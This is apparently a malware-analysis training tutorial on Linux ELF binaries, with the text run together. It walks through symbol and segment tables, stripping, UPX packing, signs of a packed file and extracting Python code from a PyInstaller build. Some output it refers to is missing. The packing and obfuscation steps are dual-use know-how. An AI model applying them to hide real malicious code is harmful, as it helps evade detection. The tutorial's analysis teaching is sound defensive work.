Run nano training_sample.c, copy the code, and save (ctrl+x)Run gcc training_sample.c -o training-sampleOBJECT: global variables declared in the code.FUNC: functions declared in the code.FILE: the source files that are compiled in the binary (This is a debug symbol. If the file was stripped from debug symbols, the symbols table won’t contain this type).RE (read and execute) flags: This is the PT_LOAD segment that describes the executable code. The file’s entrypoint should be located inside this segment.RW (read and write) flags: This is the PT_LOAD segment that contains the file’s global variables and dynamic linking information.Segments:
Anomalies in a file’s segment table can be:

Segment types and count: The file contains only PT_LOAD segments (and PT_GNU_STACK).
Flags: The file contains a segment that has all 3 flags (RWE). We will use these anomalies in the packers section.

Segment types and count: The file contains only PT_LOAD segments (and PT_GNU_STACK).Flags: The file contains a segment that has all 3 flags (RWE). We will use these anomalies in the packers section.Sections: We will review examples of unique section names in the packers and interprets sections.Run objcopy -S training-sample training-sample-strippedRun readelf -s training-sample-stripped and you will see there is only a dynamic symbol table.First, we must make the file larger by compiling it as a statically linked binary (UPX has a minimum file size and this file is currently too small).
gcc -static training_sample.c -o training-sample-staticRun: upx -9 training-sample-static -o training-sample-static-packedPacker code reuseHigh entropySegment anomaliesLarge amounts of gibberish stringsPacker signature such as UPX strings and VMprotect sections namesIf there is an unpacking solution, we will unpack the file and analyze it.If there isn’t an available unpacking solution, we will proceed to dynamic analysis.Pyinstaller: Compiles python.shc: Shell script compiler.Install Python and Pyinstaller on your VM:
sudo apt update
sudo apt install -y python3
sudo apt install -y python3-pip
sudo pip3 install pyinstallerCreate a simple python script code with test_pyinstaller.py:
nano test_pyinstaller.pyCopy the following script to test_pyinstaller.py:
for i in range(1,6):
print(f”this is output #{i}”)
And save (ctrl+x).Compile the file with Pyinstaller:
pyinstaller –onefile test_pyinstaller.pyPyinstaller created 2 directories in the source folder: dist and build. The compiled file is in the /dist directory. You can run the file and also examine the pydata section and its strings.

Download pyinextractor and uncompyle6:
sudo apt install -y git
git clone https://github.com/extremecoders-re/pyinstxtractor.git
sudo pip3 install uncompyle6Dump the pydata section using objcopy. This section holds the pyc (Python bytecodes). Let’s work in a clean directory.
mkdir training-pyinstaller
cd training-pyinstaller
objcopy –dump-section pydata=pydata.dump ../dist/test_pyinstallerRun pyinstxtractor on the pydata dump:
python3 ../pyinstxtractor/pyinstxtractor.py pydata.dumpYou should receive the following output:

pyinstxtractor created a directory named pydata.dump_extracted. Please note that the tool suggests possible entry points (in our example we know its test_pyinstaller.pyc).Decompile the relevant pyc file using uncompyle6. uncompyle6 is a Python decompiler that translates Python bytecode to equivalent Python source code:
cd pydata.dump_extracted
uncompyle6 test_pyinstaller.pycWe have now successfully extracted the Python code:
Interpreter code reuseHigh entropy (in some cases)Interpreter signature such as unique strings and section namesIf there is a script extraction solution, we will run it on the binary.If there isn’t an available script extraction solution, we will proceed to dynamic analysis."
